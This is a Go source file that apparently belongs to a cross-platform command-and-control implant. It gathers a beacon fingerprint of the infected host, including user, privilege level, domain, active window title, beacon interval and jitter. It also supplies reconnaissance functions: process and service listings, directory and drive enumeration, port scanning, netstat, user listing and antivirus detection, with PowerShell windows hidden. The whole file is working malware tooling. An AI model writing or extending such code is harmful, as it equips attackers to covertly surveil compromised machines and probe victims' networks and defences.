//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func getSystemInfo() map[string]string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	if username == "" {
		username = "unknown"
	}
	ip := getOutboundIP()

	// Match PS1 behavior: base64 encode sensitive fields + flag encoding
	utf8 := []byte(hostname)
	hostnameB64 := base64.StdEncoding.EncodeToString(utf8)
	usernameB64 := base64.StdEncoding.EncodeToString([]byte(username))
	ipB64 := base64.StdEncoding.EncodeToString([]byte(ip))

	// Process info
	procName, _ := os.Executable()
	if procName != "" {
		procName = filepath.Base(procName)
	}

	// Platform-specific enrichment (integrity, elevated, domain)
	integrity, elevated, domain := getPlatformSecurityInfo()

	info := map[string]string{
		"hostname":      hostnameB64,
		"username":      usernameB64,
		"os":            runtime.GOOS,
		"arch":          runtime.GOARCH,
		"ip":            ipB64,
		"encoding":      "base64",
		"listener_id":   fmt.Sprintf("%d", ListenerID),
		"version":       AgentVersion,
		"pid":           strconv.Itoa(os.Getpid()),
		"process_name":  procName,
		"integrity":     integrity,
		"elevated":      strconv.FormatBool(elevated),
		"domain":        domain,
		"interval":      strconv.Itoa(Interval),
		"jitter":        strconv.Itoa(Jitter),
		"active_window": getActiveWindowTitle(),
	}
	// Reported once per beacon like the rest: the operator asked for a fingerprint, and "which one did this build actually use"
	// is answerable at build time even though the server can never see the handshake itself.
	info["tls_profile"] = configuredTLSProfile()
	return info
}

func getOutboundIP() string {
	// Simple way to get preferred outbound IP
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

// getProcessList produces a simple process table similar to the PS1 agent
func getProcessList() (string, error) {
	if runtime.GOOS == "windows" {
		// Enhanced process list with more details
		script := `Get-CimInstance Win32_Process | Select-Object -Property ProcessId, Name, ExecutablePath, CommandLine, @{Name="WorkingSetMB";Expression={[math]::Round($_.WorkingSetSize/1MB,2)}}, CreationDate | Sort-Object -Property WorkingSetMB -Descending | Select-Object -First 30 | Format-Table -AutoSize | Out-String`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
		applyHideWindow(cmd)

		out, err := cmd.Output()
		if err != nil {
			// fallback to simple
			script = `Get-Process | Select-Object -Property Id, ProcessName, CPU, WorkingSet64 | Sort-Object -Property WorkingSet64 -Descending | Select-Object -First 50 | Format-Table -AutoSize | Out-String`
			cmd = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
			applyHideWindow(cmd)
			out, _ = cmd.Output()
		}
		return strings.TrimSpace(string(out)), nil
	}
	// Linux
	cmd := exec.Command("ps", "aux")
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(out)), nil
}

// procNode is one row of a process-tree listing (PID + parent PID).
type procNode struct {
	PID  int
	PPID int
	User string
	Name string
}

func getProcessTree() (string, error) {
	nodes, err := listProcessesForTree()
	if err != nil {
		return "", err
	}
	if len(nodes) == 0 {
		return "", fmt.Errorf("no processes enumerated")
	}
	return formatProcessTree(nodes), nil
}

func formatProcessTree(nodes []procNode) string {
	children := make(map[int][]procNode, len(nodes))
	byPID := make(map[int]procNode, len(nodes))
	for _, n := range nodes {
		byPID[n.PID] = n
		if n.PPID != n.PID {
			children[n.PPID] = append(children[n.PPID], n)
		}
	}
	var roots []procNode
	for _, n := range nodes {
		if _, ok := byPID[n.PPID]; !ok || n.PPID == n.PID || n.PPID == 0 {
			roots = append(roots, n)
		}
	}
	var b strings.Builder
	b.WriteString("PID\tPPID\tUSER\tNAME\n")
	seen := make(map[int]bool, len(nodes))
	var walk func(procNode, int)
	walk = func(n procNode, depth int) {
		if seen[n.PID] {
			return
		}
		seen[n.PID] = true
		indent := strings.Repeat("  ", depth)
		b.WriteString(fmt.Sprintf("%s%d\t%d\t%s\t%s\n", indent, n.PID, n.PPID, n.User, n.Name))
		for _, c := range children[n.PID] {
			walk(c, depth+1)
		}
	}
	for _, r := range roots {
		walk(r, 0)
	}
	for _, n := range nodes {
		if !seen[n.PID] {
			walk(n, 0)
		}
	}
	return b.String()
}

// listDirectory lists a directory with simple tabular output (Type Name Size Modified)
func listDirectory(path string) (string, error) {
	if path == "" {
		if runtime.GOOS == "windows" {
			path = "C:\\"
		} else {
			path = "/"
		}
	}
	entries, err := os.ReadDir(path)
	if err != nil {
		return "", err
	}

	var sb strings.Builder
	sb.WriteString("Type\tName\tSize\tModified\n")
	sb.WriteString(strings.Repeat("-", 80) + "\n")

	for _, e := range entries {
		info, err := e.Info()
		mod := ""
		size := "-"
		if err == nil {
			mod = info.ModTime().Format("2006-01-02 15:04")
			if !e.IsDir() {
				size = fmt.Sprintf("%d", info.Size())
			}
		}
		typ := "FILE"
		if e.IsDir() {
			typ = "DIR"
		}
		sb.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\n", typ, e.Name(), size, mod))
	}
	return sb.String(), nil
}

func listDrives() (string, error) {
	var sb strings.Builder
	sb.WriteString("Drive\tType\tFree\tTotal\n")
	sb.WriteString("-----\t----\t----\t-----\n")

	if runtime.GOOS == "windows" {
		// Use PowerShell for drives
		script := `Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, DriveType, @{Name="FreeSpaceGB";Expression={[math]::Round($_.FreeSpace/1GB,2)}}, @{Name="SizeGB";Expression={[math]::Round($_.Size/1GB,2)}} | Format-Table -AutoSize | Out-String`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
		applyHideWindow(cmd)
		out, err := cmd.Output()
		if err != nil {
			return "", err
		}
		return string(out), nil
	}

	// Linux / Unix
	entries, err := os.ReadDir("/")
	if err != nil {
		return "", err
	}
	for _, e := range entries {
		if e.IsDir() {
			// simple, check if mount point like /dev /proc but list all dirs under /
			sb.WriteString(fmt.Sprintf("%s\tDIR\t-\t-\n", e.Name()))
		}
	}
	// Better: use df if available
	cmd := exec.Command("df", "-h")
	out, err := cmd.Output()
	if err == nil {
		return string(out), nil
	}
	return sb.String(), nil
}

func listServices() (string, error) {
	if runtime.GOOS == "windows" {
		script := `Get-Service | Select-Object -Property Name, DisplayName, Status, StartType | Sort-Object -Property Status, Name | Format-Table -AutoSize | Out-String`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
		applyHideWindow(cmd)
		out, err := cmd.Output()
		if err != nil {
			return "", err
		}
		return string(out), nil
	}
	// Linux simple
	cmd := exec.Command("systemctl", "list-units", "--type=service", "--no-pager")
	out, err := cmd.Output()
	if err != nil {
		cmd = exec.Command("service", "--status-all")
		out, err = cmd.Output()
		if err != nil {
			return "use ps or systemctl", nil
		}
	}
	return string(out), nil
}

func portScan(target string, network ...string) (string, error) {
	// target like "192.168.1.1:80,443" or "10.0.0.1-10:22"
	netw := "tcp"
	if len(network) > 0 && network[0] != "" {
		netw = network[0]
	}
	parts := strings.SplitN(target, ":", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("format: ip:ports or ip:port1,port2")
	}
	ips := strings.Split(parts[0], ",")
	ports := strings.Split(parts[1], ",")

	var results []string
	for _, ip := range ips {
		for _, port := range ports {
			addr := net.JoinHostPort(strings.TrimSpace(ip), strings.TrimSpace(port))
			conn, err := net.DialTimeout(netw, addr, 2*time.Second)
			if err == nil {
				results = append(results, addr+" open")
				conn.Close()
			} else {
				results = append(results, addr+" closed")
			}
		}
	}
	return strings.Join(results, "\n"), nil
}

func netStat() (string, error) {
	if runtime.GOOS == "windows" {
		out, err := runShell("netstat -ano", "cmd.exe")
		return out, err
	}
	out, err := runShell("netstat -tunap", "")
	return out, err
}

func listUsers() (string, error) {
	if runtime.GOOS == "windows" {
		out, err := runShell("net user", "cmd.exe")
		if err != nil {
			out, _ = runShell("whoami /all", "cmd.exe")
		}
		return out, nil
	}
	out, err := runShell("who", "")
	return out, err
}

func detectAV() (string, error) {
	if runtime.GOOS == "windows" {
		script := `Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState | Format-List | Out-String`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
		applyHideWindow(cmd)
		out, err := cmd.Output()
		if err == nil {
			return string(out), nil
		}
		return runShell("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", "cmd.exe")
	}
	return "use ps aux | grep -E 'av|clam|eset|symantec|trend'", nil
}
